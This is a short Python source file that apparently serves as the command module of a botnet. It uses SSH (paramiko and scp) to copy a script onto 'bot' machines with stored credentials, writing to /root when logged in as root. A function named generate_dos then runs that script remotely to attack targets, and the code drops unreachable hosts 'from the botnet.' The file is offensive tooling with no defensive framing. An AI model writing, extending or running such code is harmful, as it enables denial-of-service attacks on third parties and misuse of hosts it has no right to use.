from paramiko import SSHClient
from scp import SCPClient
import paramiko
import sys

def generate_dos(bot, username, password, script, targets):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=bot, username=username, password=password)
    ssh.exec_command("python {}".format(script))

    return("break")

def transfer_script(bot, username, password, script):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    remove_bots = []
    try:
        ssh.connect(hostname=bot,username=username,password=password)
        
        if not username == "root":
            loc = "/home/{}/{}".format(username, script)
        else:
            loc = "/root/{}".format(script)
        
        with SCPClient(ssh.get_transport()) as scp:
            scp.put(script, loc)

    except Exception as error:
        remove_bots.append(bot)
        sys.stderr.write("\n" + str(error) + " {}. Removing from the botnet.\n".format(bot))
        sys.stderr.flush()

    return(remove_bots)